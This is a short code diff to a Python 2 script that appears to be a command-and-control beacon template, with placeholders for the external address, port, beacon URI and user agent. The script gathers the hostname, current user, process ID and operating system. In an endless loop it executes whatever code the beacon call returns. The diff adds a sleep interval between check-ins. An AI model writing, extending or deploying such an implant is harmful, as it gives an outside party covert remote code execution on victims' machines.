@@ -1,4 +1,4 @@
-import urllib2, json, getpass, os, platform, socket, sys
+import urllib2, json, getpass, os, platform, socket, sys, time
 
 
 external_address = "EXTERNAL_ADDRESS"
@@ -6,6 +6,7 @@ port = "PORT"
 protocol = "PROTOCOL"
 beacon_uri = "BEACON_URI"
 user_agent = "USER_AGENT"
+sleep_interval = "SLEEP_INTERVAL"
 
 
 def get_system_info():
@@ -43,3 +44,4 @@ if __name__ == "__main__":
     while True:
         hostname, current_user, process_id, operating_system = get_system_info()
         exec(beacon(hostname, current_user, process_id, operating_system))
+        time.sleep(sleep_interval)
